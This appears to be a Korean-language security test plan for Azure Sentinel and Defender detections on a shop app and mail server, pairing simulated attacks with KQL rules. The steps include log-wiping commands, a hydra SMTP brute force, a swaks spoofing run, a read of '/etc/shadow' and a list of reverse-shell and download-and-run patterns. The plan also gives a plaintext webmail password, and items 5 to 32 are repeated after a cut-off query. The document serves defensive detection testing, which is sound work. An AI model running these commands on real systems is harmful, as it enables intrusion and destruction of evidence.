*   **내용:** TI 기반 위협 탐지를 검증합니다.
*   **방법:** 악성 평판 IP로 `curl` 요청 시도 -> Sentinel 인시던트 생성 확인.
*   **참고:** Sentinel Threat Intelligence Connector

**4. KQL(Kusto Query Language) 기반 위협 분석**
*   **담당자:** 현지
*   **내용:** 로그 분석 역량을 검증합니다.
*   **방법:** Log Analytics에서 사용자 지정 쿼리 작성 및 결과 분석.
*   **참고:** `Log Analytics Workspace` 구성됨

**5. Defender for Cloud (CSPM) 보안 권고 사항 확인**
*   **담당자:** 현지
*   **내용:** 클라우드 보안 형상 관리(CSPM)를 수행합니다.
*   **방법:** Defender 대시보드에서 보안 점수(Secure Score) 확인 및 권고 사항(MFA 미설정 등) 확인.
*   **참고:** Terraform `modules/Security/08_defender.tf`

**6. VM 멀웨어 탐지 시뮬레이션 (EICAR)**
*   **담당자:** 현지
*   **내용:** 엔드포인트 보안 솔루션 동작을 확인합니다.
*   **방법:** VM에서 EICAR 테스트 파일 다운로드 -> Defender가 격리 및 알림 발송 확인.
*   **참고:** Defender for Servers

**7. Sentinel 분석 규칙(Analytics Rule) 생성**
*   **담당자:** 현지
*   **내용:** 사용자 정의 탐지 규칙을 생성합니다.
*   **방법:** Sentinel -> 분석 -> 규칙 만들기 -> KQL 입력 -> 활성화.
*   **참고:** Terraform `modules/Security/07_sentinel_rules.tf`

**8. SOAR 자동화 대응 (Logic App Playbook)**
*   **담당자:** 현지
*   **내용:** 보안 사고 자동 대응을 구현합니다.
*   **방법:** 인시던트 발생 시 Logic App 트리거 -> Teams/메일 알림 수신 확인.
*   **참고:** Logic App Playbook 구성

**9. 의심스러운 프로세스 실행 탐지**
*   **담당자:** 현지
*   **내용:** 비정상 프로세스(채굴기 등)를 탐지합니다.
*   **방법:** 프로세스 명을 채굴기 이름(예: `xmrig`)으로 가장하여 실행 -> Defender 탐지 확인.
*   **참고:** Defender Endpoint Protection

**10. 보안 사고(Incident) 조사 및 종결**
*   **담당자:** 현지
*   **내용:** 관제 프로세스의 마무리를 수행합니다.
*   **방법:** Sentinel 조사 그래프 분석 -> 근본 원인 파악 -> 상태 'Closed' 변경.
*   **참고:** Sentinel Incident Management

**11. DDoS 공격 시뮬레이션 (Basic)**
*   **담당자:** 현지
*   **내용:** **[제한사항]** DDoS Protection Standard 미사용(비용). Basic 방어만 확인.
*   **방법:** `hping3`로 패킷 전송. 서비스 가용성 모니터링.

**12. 데이터 유출(Data Exfiltration) 시도 탐지**
*   **담당자:** 현지
*   **내용:** 외부로의 대용량 데이터 전송을 탐지합니다.
*   **방법:** 내부 VM -> 외부 서버 SCP 대용량 전송 -> Network Watcher/Sentinel 트래픽 급증 탐지.
*   **참고:** Network Anomaly Detection

**13. 웹쉘(Web Shell) 업로드 및 실행 차단**
*   **담당자:** 현지
*   **내용:** 웹 서버 침해 시도를 탐지/차단합니다.
*   **방법:** 웹쉘 파일 업로드 시도. Defender가 악성 파일로 식별하여 삭제하는지 확인.
*   **참고:** Defender for Servers

**14. 권한 상승(Privilege Escalation) 시도**
*   **담당자:** 현지
*   **내용:** 시스템 권한 탈취 시도를 탐지합니다.
*   **방법:** `sudo` 권한 없는 계정으로 명령어 반복 실패. `Syslog` 기반 탐지 쿼리 확인.
*   **참고:** Linux Audit Logs

**15. 포트 스캐닝(Port Scanning) 탐지**
*   **담당자:** 현지
*   **내용:** 정찰 행위를 탐지합니다.
*   **방법:** 외부에서 `nmap` 스캔 수행. Sentinel에서 스캔 패턴 탐지 룰 트리거 확인.
*   **참고:** `modules/Security/07_sentinel_rules.tf` (port_scan 규칙 수정 필요)

**16. 랜섬웨어 행위 모의 실험**
*   **담당자:** 현지
*   **내용:** 파일 일괄 변조 행위를 탐지합니다.
*   **방법:** 스크립트로 다수 파일 확장자 변경 시도 -> Defender 이상 행위 탐지.
*   **참고:** Defender Endpoint Behavioral Analysis

**17. 불가능한 여행(Impossible Travel) 로그인**
*   **담당자:** 현지
*   **내용:** **[제한사항]** AAD P2(Identity Protection) 없음.
*   **대안:** Sentinel 사용자 지정 규칙으로 구현(서로 다른 IP가 짧은 시간 내 접속).
*   **방법:** VPN 활용하여 한국/미국 IP로 연속 로그인 시도 후 탐지 확인.

**18. 로그 삭제/변조 시도 탐지**
*   **담당자:** 현지
*   **내용:** 침해 흔적 삭제 행위를 탐지합니다.
*   **방법:** `rm -rf /var/log/*` 명령 실행. Auditd 로그를 통해 Sentinel 알림 발생 확인.
*   **참고:** Linux Auditd Configuration

**19. 알려진 취약점(CVE) 익스플로잇 시도**
*   **담당자:** 현지
*   **내용:** 취약점 공격 탐지를 확인합니다.
*   **방법:** Metasploit 등으로 취약점 공격 패킷 전송. IPS/WAF 차단 로그 확인.
*   **참고:** Threat Intelligence Matching

**20. 비정상적인 프로세스/서비스 등록 탐지**
*   **담당자:** 현지
*   **내용:** 지속성(Persistence) 확보 시도를 탐지합니다.
*   **방법:** `systemd` 서비스 등록 시도. Defender FIM 또는 프로세스 모니터링 탐지 확인.
*   **참고:** Defender for Servers

**(Lupang 특화 위협 탐지)**

**21. Lupang 로그인 Brute Force 공격 탐지**
*   **담당자:** 현지
*   **내용:** 앱 레벨의 무차별 대입 공격을 탐지합니다.
*   **방법:** SSH Brute Force 규칙을 응용하여 앱 로그(`Login Failed`) 기반 탐지.
*   **참고:** `modules/Security/07_sentinel_rules.tf`

**22. SQL Injection 공격 시도 자동 탐지 및 차단**
*   **담당자:** 현지
*   **내용:** 공격 IP 자동 차단(SOAR)을 검증합니다.
*   **방법:** SQL Injection 시도 -> Sentinel 탐지 -> Logic App 실행 -> NSG IP 차단.
*   **참고:** Logic App Playbook (Block-IP)

**23. 관리자 권한 무단 접근 탐지**
*   **담당자:** 현지
*   **내용:** 민감 기능 접근을 모니터링합니다.
*   **방법:** 관리자 페이지 'DB Dump' 클릭 -> 앱 로그 기록 -> Sentinel 알림 발생.
*   **참고:** Custom Log Collection

**24. XSS 공격 시도 로그 분석**
*   **담당자:** 현지
*   **내용:** WAF 로그 분석을 수행합니다.
*   **방법:** WAF가 차단한 XSS 로그를 Log Analytics에서 조회 및 분석.
*   **쿼리:** `AzureDiagnostics | where Category == "ApplicationGatewayFirewallLog"` (스키마 확인 필요)

**25. 의심스러운 토큰 조작 탐지**
*   **담당자:** 현지
*   **내용:** 인증 토큰 이상 징후를 탐지합니다.
*   **방법:** 동일 IP에서 토큰 값이 빈번하게 변경되는 패턴 탐지 쿼리 작성.
*   **참고:** KQL Custom Rule

**26. 비정상적인 대량 상품 조회 패턴 탐지**
*   **담당자:** 현지
*   **내용:** 크롤링/매크로 의심 행위를 탐지합니다.
*   **방법:** 1분 내 100회 이상 페이지 조회 시도. Sentinel 임계치 기반 룰 탐지.
*   **참고:** Rate Limiting Detection

**27. 웹쉘 업로드 시도 탐지 (uploads 디렉토리)**
*   **담당자:** 현지
*   **내용:** 파일 업로드 공격을 탐지합니다.
*   **방법:** `uploads` 폴더에 실행 파일 생성 시 Defender/FIM 탐지 확인.
*   **참고:** Defender File Protection

**28. Lupang 서비스 중단(DoS) 탐지 및 복구**
*   **담당자:** 현지
*   **내용:** 서비스 가용성 위협을 탐지합니다.
*   **방법:** Apache 프로세스 킬 -> Health Probe 실패 로그 -> VMSS 자동 복구 확인.
*   **참고:** Availability Alert Rule

**29. 비정상 시간대 로그인 탐지**
*   **담당자:** 현지
*   **내용:** 업무 시간 외 로그인을 탐지합니다.
*   **방법:** 새벽 2~5시 로그인 시도.
*   **쿼리:**
    ```kql
    Syslog
    | where Facility == "auth" or Facility == "authpriv"
    | where SyslogMessage contains "Accepted"
    | extend Hour = datetime_part("hour", TimeGenerated)
    | where Hour >= 2 and Hour <= 5
    | project TimeGenerated, Computer, SyslogMessage
    ```
*   **참고:** Sentinel 규칙 `off_hours_login`

**30. 데이터베이스 무단 접근 시도 탐지**
*   **담당자:** 현지
*   **내용:** 허용되지 않은 경로의 DB 접근을 탐지합니다.
*   **방법:** WAS가 아닌 IP에서 DB 포트 접속 시도 -> 방화벽 차단 로그 Sentinel 수집 확인.
*   **참고:** Network Security Analytics

**(메일 서버 보안 시나리오)**

**31. SMTP 브루트포스 공격 탐지**
*   **담당자:** 현지
*   **내용:** 메일 서버 SMTP 인증에 대한 무차별 대입 공격을 탐지합니다.
*   **방법:**
    1.  메일 서버 IP 확인: `nslookup mail.04www.cloud`
    2.  공격 실행(Kali): `hydra -l www -P /usr/share/wordlists/rockyou.txt smtp://<MAIL_IP> -t 4`
    3.  Sentinel 탐지 확인: 5분 내 "SMTP Authentication Brute Force Attack" 인시던트 생성
*   **쿼리:**
    ```kql
    Syslog
    | where Facility == "mail"
    | where SyslogMessage contains "authentication failed" or SyslogMessage contains "SASL LOGIN authentication failed"
    | summarize FailedAttempts = count() by Computer, Bin = bin(TimeGenerated, 5m)
    | where FailedAttempts > 5
    ```
*   **참고:** Terraform `modules/Security/07_sentinel_rules.tf`

**32. 메일 스푸핑(Spoofing) 시도 탐지**
*   **담당자:** 현지
*   **내용:** 위조된 발신자로 메일 발송 시도 시 SPF 검증 실패를 탐지합니다.
*   **방법:**
    1.  공격 실행(Kali): `swaks --to www@04www.cloud --from fake@attacker.com --server <MAIL_IP>`
    2.  Sentinel에서 "Email Spoofing Attempt Detected" 인시던트 확인
*   **쿼리:**
    ```kql
    Syslog
    | where Facility == "mail"
**5. Defender for Cloud (CSPM) 보안 권고 사항 확인**
*   **담당자:** 현지
*   **내용:** 클라우드 보안 형상 관리(CSPM)를 수행합니다.
*   **방법:** Defender 대시보드에서 보안 점수(Secure Score) 확인 및 권고 사항(MFA 미설정 등) 확인.
*   **참고:** Terraform `modules/Security/08_defender.tf`

**6. VM 멀웨어 탐지 시뮬레이션 (EICAR)**
*   **담당자:** 현지
*   **내용:** 엔드포인트 보안 솔루션 동작을 확인합니다.
*   **방법:** VM에서 EICAR 테스트 파일 다운로드 -> Defender가 격리 및 알림 발송 확인.
*   **참고:** Defender for Servers

**7. Sentinel 분석 규칙(Analytics Rule) 생성**
*   **담당자:** 현지
*   **내용:** 사용자 정의 탐지 규칙을 생성합니다.
*   **방법:** Sentinel -> 분석 -> 규칙 만들기 -> KQL 입력 -> 활성화.
*   **참고:** Terraform `modules/Security/07_sentinel_rules.tf`

**8. SOAR 자동화 대응 (Logic App Playbook)**
*   **담당자:** 현지
*   **내용:** 보안 사고 자동 대응을 구현합니다.
*   **방법:** 인시던트 발생 시 Logic App 트리거 -> Teams/메일 알림 수신 확인.
*   **참고:** Logic App Playbook 구성

**9. 의심스러운 프로세스 실행 탐지**
*   **담당자:** 현지
*   **내용:** 비정상 프로세스(채굴기 등)를 탐지합니다.
*   **방법:** 프로세스 명을 채굴기 이름(예: `xmrig`)으로 가장하여 실행 -> Defender 탐지 확인.
*   **참고:** Defender Endpoint Protection

**10. 보안 사고(Incident) 조사 및 종결**
*   **담당자:** 현지
*   **내용:** 관제 프로세스의 마무리를 수행합니다.
*   **방법:** Sentinel 조사 그래프 분석 -> 근본 원인 파악 -> 상태 'Closed' 변경.
*   **참고:** Sentinel Incident Management

**11. DDoS 공격 시뮬레이션 (Basic)**
*   **담당자:** 현지
*   **내용:** **[제한사항]** DDoS Protection Standard 미사용(비용). Basic 방어만 확인.
*   **방법:** `hping3`로 패킷 전송. 서비스 가용성 모니터링.

**12. 데이터 유출(Data Exfiltration) 시도 탐지**
*   **담당자:** 현지
*   **내용:** 외부로의 대용량 데이터 전송을 탐지합니다.
*   **방법:** 내부 VM -> 외부 서버 SCP 대용량 전송 -> Network Watcher/Sentinel 트래픽 급증 탐지.
*   **참고:** Network Anomaly Detection

**13. 웹쉘(Web Shell) 업로드 및 실행 차단**
*   **담당자:** 현지
*   **내용:** 웹 서버 침해 시도를 탐지/차단합니다.
*   **방법:** 웹쉘 파일 업로드 시도. Defender가 악성 파일로 식별하여 삭제하는지 확인.
*   **참고:** Defender for Servers

**14. 권한 상승(Privilege Escalation) 시도**
*   **담당자:** 현지
*   **내용:** 시스템 권한 탈취 시도를 탐지합니다.
*   **방법:** `sudo` 권한 없는 계정으로 명령어 반복 실패. `Syslog` 기반 탐지 쿼리 확인.
*   **참고:** Linux Audit Logs

**15. 포트 스캐닝(Port Scanning) 탐지**
*   **담당자:** 현지
*   **내용:** 정찰 행위를 탐지합니다.
*   **방법:** 외부에서 `nmap` 스캔 수행. Sentinel에서 스캔 패턴 탐지 룰 트리거 확인.
*   **참고:** `modules/Security/07_sentinel_rules.tf` (port_scan 규칙 수정 필요)

**16. 랜섬웨어 행위 모의 실험**
*   **담당자:** 현지
*   **내용:** 파일 일괄 변조 행위를 탐지합니다.
*   **방법:** 스크립트로 다수 파일 확장자 변경 시도 -> Defender 이상 행위 탐지.
*   **참고:** Defender Endpoint Behavioral Analysis

**17. 불가능한 여행(Impossible Travel) 로그인**
*   **담당자:** 현지
*   **내용:** **[제한사항]** AAD P2(Identity Protection) 없음.
*   **대안:** Sentinel 사용자 지정 규칙으로 구현(서로 다른 IP가 짧은 시간 내 접속).
*   **방법:** VPN 활용하여 한국/미국 IP로 연속 로그인 시도 후 탐지 확인.

**18. 로그 삭제/변조 시도 탐지**
*   **담당자:** 현지
*   **내용:** 침해 흔적 삭제 행위를 탐지합니다.
*   **방법:** `rm -rf /var/log/*` 명령 실행. Auditd 로그를 통해 Sentinel 알림 발생 확인.
*   **참고:** Linux Auditd Configuration

**19. 알려진 취약점(CVE) 익스플로잇 시도**
*   **담당자:** 현지
*   **내용:** 취약점 공격 탐지를 확인합니다.
*   **방법:** Metasploit 등으로 취약점 공격 패킷 전송. IPS/WAF 차단 로그 확인.
*   **참고:** Threat Intelligence Matching

**20. 비정상적인 프로세스/서비스 등록 탐지**
*   **담당자:** 현지
*   **내용:** 지속성(Persistence) 확보 시도를 탐지합니다.
*   **방법:** `systemd` 서비스 등록 시도. Defender FIM 또는 프로세스 모니터링 탐지 확인.
*   **참고:** Defender for Servers

**(Lupang 특화 위협 탐지)**

**21. Lupang 로그인 Brute Force 공격 탐지**
*   **담당자:** 현지
*   **내용:** 앱 레벨의 무차별 대입 공격을 탐지합니다.
*   **방법:** SSH Brute Force 규칙을 응용하여 앱 로그(`Login Failed`) 기반 탐지.
*   **참고:** `modules/Security/07_sentinel_rules.tf`

**22. SQL Injection 공격 시도 자동 탐지 및 차단**
*   **담당자:** 현지
*   **내용:** 공격 IP 자동 차단(SOAR)을 검증합니다.
*   **방법:** SQL Injection 시도 -> Sentinel 탐지 -> Logic App 실행 -> NSG IP 차단.
*   **참고:** Logic App Playbook (Block-IP)

**23. 관리자 권한 무단 접근 탐지**
*   **담당자:** 현지
*   **내용:** 민감 기능 접근을 모니터링합니다.
*   **방법:** 관리자 페이지 'DB Dump' 클릭 -> 앱 로그 기록 -> Sentinel 알림 발생.
*   **참고:** Custom Log Collection

**24. XSS 공격 시도 로그 분석**
*   **담당자:** 현지
*   **내용:** WAF 로그 분석을 수행합니다.
*   **방법:** WAF가 차단한 XSS 로그를 Log Analytics에서 조회 및 분석.
*   **쿼리:** `AzureDiagnostics | where Category == "ApplicationGatewayFirewallLog"` (스키마 확인 필요)

**25. 의심스러운 토큰 조작 탐지**
*   **담당자:** 현지
*   **내용:** 인증 토큰 이상 징후를 탐지합니다.
*   **방법:** 동일 IP에서 토큰 값이 빈번하게 변경되는 패턴 탐지 쿼리 작성.
*   **참고:** KQL Custom Rule

**26. 비정상적인 대량 상품 조회 패턴 탐지**
*   **담당자:** 현지
*   **내용:** 크롤링/매크로 의심 행위를 탐지합니다.
*   **방법:** 1분 내 100회 이상 페이지 조회 시도. Sentinel 임계치 기반 룰 탐지.
*   **참고:** Rate Limiting Detection

**27. 웹쉘 업로드 시도 탐지 (uploads 디렉토리)**
*   **담당자:** 현지
*   **내용:** 파일 업로드 공격을 탐지합니다.
*   **방법:** `uploads` 폴더에 실행 파일 생성 시 Defender/FIM 탐지 확인.
*   **참고:** Defender File Protection

**28. Lupang 서비스 중단(DoS) 탐지 및 복구**
*   **담당자:** 현지
*   **내용:** 서비스 가용성 위협을 탐지합니다.
*   **방법:** Apache 프로세스 킬 -> Health Probe 실패 로그 -> VMSS 자동 복구 확인.
*   **참고:** Availability Alert Rule

**29. 비정상 시간대 로그인 탐지**
*   **담당자:** 현지
*   **내용:** 업무 시간 외 로그인을 탐지합니다.
*   **방법:** 새벽 2~5시 로그인 시도.
*   **쿼리:**
    ```kql
    Syslog
    | where Facility == "auth" or Facility == "authpriv"
    | where SyslogMessage contains "Accepted"
    | extend Hour = datetime_part("hour", TimeGenerated)
    | where Hour >= 2 and Hour <= 5
    | project TimeGenerated, Computer, SyslogMessage
    ```
*   **참고:** Sentinel 규칙 `off_hours_login`

**30. 데이터베이스 무단 접근 시도 탐지**
*   **담당자:** 현지
*   **내용:** 허용되지 않은 경로의 DB 접근을 탐지합니다.
*   **방법:** WAS가 아닌 IP에서 DB 포트 접속 시도 -> 방화벽 차단 로그 Sentinel 수집 확인.
*   **참고:** Network Security Analytics

**(메일 서버 보안 시나리오)**

**31. SMTP 브루트포스 공격 탐지**
*   **담당자:** 현지
*   **내용:** 메일 서버 SMTP 인증에 대한 무차별 대입 공격을 탐지합니다.
*   **방법:**
    1.  메일 서버 IP 확인: `nslookup mail.04www.cloud`
    2.  공격 실행(Kali): `hydra -l www -P /usr/share/wordlists/rockyou.txt smtp://<MAIL_IP> -t 4`
    3.  Sentinel 탐지 확인: 5분 내 "SMTP Authentication Brute Force Attack" 인시던트 생성
*   **쿼리:**
    ```kql
    Syslog
    | where Facility == "mail"
    | where SyslogMessage contains "authentication failed" or SyslogMessage contains "SASL LOGIN authentication failed"
    | summarize FailedAttempts = count() by Computer, Bin = bin(TimeGenerated, 5m)
    | where FailedAttempts > 5
    ```
*   **참고:** Terraform `modules/Security/07_sentinel_rules.tf`

**32. 메일 스푸핑(Spoofing) 시도 탐지**
*   **담당자:** 현지
*   **내용:** 위조된 발신자로 메일 발송 시도 시 SPF 검증 실패를 탐지합니다.
*   **방법:**
    1.  공격 실행(Kali): `swaks --to www@04www.cloud --from fake@attacker.com --server <MAIL_IP>`
    2.  Sentinel에서 "Email Spoofing Attempt Detected" 인시던트 확인
*   **쿼리:**
    ```kql
    Syslog
    | where Facility == "mail"
    | where SyslogMessage contains "SPF" and (SyslogMessage contains "fail" or SyslogMessage contains "softfail")
    | project TimeGenerated, Computer, SyslogMessage
    ```
*   **참고:** DNS SPF 레코드 설정 (`v=spf1 a mx ip4:<MAIL_IP> -all`)

**33. 웹메일(Roundcube) 무단 접근 시도**
*   **담당자:** 현지
*   **내용:** 웹메일 로그인 페이지에 대한 브루트포스 공격을 탐지합니다.
*   **방법:**
    1.  웹메일 접속: `http://mail.04www.cloud/roundcube`
    2.  잘못된 비밀번호로 반복 로그인 시도
    3.  Apache access.log 또는 Roundcube 로그 분석
*   **참고:** 계정 `www` / 비밀번호 `It12345!`

**(고급 공격 탐지 시나리오)**

**34. 권한 상승(Privilege Escalation) 시도 탐지**
*   **담당자:** 현지
*   **내용:** sudo 권한 없는 사용자의 권한 상승 시도를 탐지합니다.
*   **탐지 대상:** 
    - `sudo` 명령 실행 시 "NOT in sudoers" 메시지
    - 잘못된 sudo 비밀번호 입력
*   **방법:**
    1.  VM 접속 후 일반 계정 생성: `sudo useradd testuser`
    2.  testuser로 전환: `su - testuser`
    3.  sudo 시도: `sudo cat /etc/shadow` → 실패
    4.  Sentinel에서 "Sudo/Su Privilege Escalation Failed" 인시던트 확인
*   **참고:** Sentinel 규칙 `privilege_escalation`

**35. 의심스러운 명령어 실행 탐지**
*   **담당자:** 현지
*   **내용:** 리버스 쉘, 다운로더 등 악성 명령어 실행을 탐지합니다.
*   **탐지 대상:** 
    - `wget http://...`, `curl ... | bash`
    - `nc -e /bin/bash`, `bash -i`
    - `python -c`, `base64 -d`
*   **방법:**
    1.  VM에서 의심 명령 실행: `wget http://example.com/test.sh`
    2.  Sentinel에서 "Suspicious Process/Command Detected" 인시던트 확인
*   **참고:** Sentinel 규칙 `suspicious_process`

**36. 로그 변조/삭제 시도 탐지**
*   **담당자:** 현지
*   **내용:** 공격 흔적 삭제를 위한 로그 변조 시도를 탐지합니다.
*   **탐지 대상:** 
    - `rm /var/log/*`, `rm -rf /var/log/auth.log`
    - `truncate -s 0 /var/log/syslog`
    - `> /var/log/messages`
*   **방법:**
    1.  VM에서 로그 삭제 시도: `sudo rm /var/log/test.log`
    2.  Sentinel에서 "Log File Deletion or Tampering" 인시던트 확인
*   **참고:** Sentinel 규칙 `log_tampering`

**37. 대량 HTTP 요청 (DDoS/크롤러) 탐지**
*   **담당자:** 현지
*   **내용:** 분당 100회 이상 HTTP 요청을 보내는 IP를 탐지합니다.
*   **탐지 대상:** 
    - 동일 IP에서 1분 내 100+ 요청
    - Application Gateway Access Log 기반
*   **방법:**
    1.  Kali에서 대량 요청: `ab -n 200 -c 10 http://04www.cloud/`
    2.  Sentinel에서 "Suspicious Mass HTTP Requests" 인시던트 확인
*   **참고:** Sentinel 규칙 `mass_http_requests`

**38. 포트 스캐닝 탐지**
*   **담당자:** 현지
*   **내용:** 5분 내 10개 이상 포트 스캔 시도를 탐지합니다.
*   **탐지 대상:** 
    - NSG에서 차단된 인바운드 트래픽
    - 다수 포트에 대한 연결 시도
*   **방법:**
    1.  Kali에서 포트 스캔: `nmap -p 1-1000 <TARGET_IP>`
    2.  Sentinel에서 "Port Scanning Activity Detected" 인시던트 확인
*   **참고:** Sentinel 규칙 `port_scan`

## Sentinel 탐지 규칙 상태 (참고)

| 규칙 | 상태 | 설명 |
|:---|:---:|:---|
| **SSH Brute Force** | ✅ 활성 | 공격자 IP/사용자명 추출, 3회 이상 실패 탐지 |
| **RBAC 변경** | ✅ 활성 | 역할 할당 변경 탐지 |
| **비정상 시간대 로그인** | ✅ 활성 | 02:00-05:00 로그인, 사용자명/IP 추출 |
| **악성 IP 통신** | ✅ 활성 | Defender for Cloud 네트워크 알림 기반 |
| **웹 공격 (WAF)** | ✅ 활성 | SQLi, XSS 등 공격 유형 분류 |
| **SMTP Brute Force** | ✅ 활성 | 메일 서버 인증 실패 탐지 |
| **Mail Spoofing** | ✅ 활성 | SPF 검증 실패 탐지 |
| **권한 상승 시도** | ✅ 활성 | sudo 실패 탐지 |
| **의심 명령어** | ✅ 활성 | wget, nc, bash -i 등 탐지 |
| **로그 변조** | ✅ 활성 | rm /var/log 등 탐지 |
| **대량 HTTP** | ✅ 활성 | 분당 100+ 요청 탐지 |
| **Port Scan** | ⏸️ 비활성 | NSG Flow Logs 지원 종료로 비활성화 |

> **포트 스캔 탐지 대안**: Defender for Servers에서 네트워크 위협으로 탐지됩니다. Azure Portal → Defender for Cloud → Security Alerts에서 확인하세요.
